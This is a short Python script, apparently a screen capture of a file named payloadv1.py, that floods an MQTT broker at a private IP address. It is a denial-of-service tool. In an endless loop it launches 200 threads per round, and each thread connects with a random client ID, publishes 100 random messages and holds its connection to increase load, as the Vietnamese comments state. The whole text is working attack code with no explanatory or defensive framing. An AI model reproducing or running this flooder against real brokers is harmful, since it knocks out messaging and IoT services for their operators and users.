  GNU nano 8.3                                                                          payloadv1.py                                                                                    
import paho.mqtt.client as mqtt
import threading
import time
import random
import string

BROKER_IP = '192.168.110.170'
BROKER_PORT = 1883

def random_client_id(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def flood_client():
    client_id = random_client_id()
    try:
        client = mqtt.Client(client_id=client_id)
        client.connect(BROKER_IP, BROKER_PORT, keepalive=60)
        client.loop_start()
        # Liên tục publish message gây tải broker
        for _ in range(100):
            topic = "test/topic"
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
            client.publish(topic, payload)
            time.sleep(0.01)
        time.sleep(5)  # Giữ kết nối lâu để tăng tải
        client.loop_stop()
        client.disconnect()
        print(f"Flooded client: {client_id}")
    except Exception as e:
        print(f"Error client {client_id}: {e}")

def flood(rate=100):
    threads = []
    for _ in range(rate):
        t = threading.Thread(target=flood_client)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    while True:
        flood(200)  # Tăng threads flood
